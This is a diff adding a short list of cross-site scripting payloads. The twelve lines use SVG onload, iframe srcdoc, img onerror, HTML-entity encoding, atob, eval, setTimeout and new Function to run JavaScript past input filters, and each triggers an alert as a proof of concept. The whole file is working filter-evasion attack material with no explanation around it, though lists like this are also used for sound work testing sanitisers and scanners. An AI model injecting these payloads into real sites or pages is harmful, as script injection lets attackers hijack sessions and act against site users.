@@ -1,0 +1,12 @@
+<svg onload='&#97;&#108;&#101;&#114;&#116;&#40;&#96;&#104;&#105;&#33;&#96;&#41;'>
+<iframe srcdoc='<img src=x onerror="e=alert,e(1)">'></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;">
+<iframe srcdoc="<svg onload=eval(&#96;&#97;&#108;&#101;&#114;&#116;&#96;+&#96;&#40;&#96;+&#96;1&#96;+&#96;&#41;&#96;)>"></iframe>
+<iframe srcdoc="<script>eval('&#97;&#108;&#101;&#114;&#116;&#40;1&#41;')</script>"></iframe>
+<iframe srcdoc='<svg onload=window[atob("YWxlcnQ=")](1)></svg>'></iframe>
+<svg onload="eval('alert(1)')">
+<svg onload="setTimeout(() => {alert('XSS')}, 1)">
+<iframe srcdoc="<svg xmlns='http://www.w3.org/2000/svg' onload='javascript:alert(1)'></svg>"></iframe>
+<svg onload="setTimeout('alert(1)', 0)">
+<svg onload="new Function('alert(1)')()">
+<iframe srcdoc="<img src=x onerror='window.alert(1)'>"></iframe>
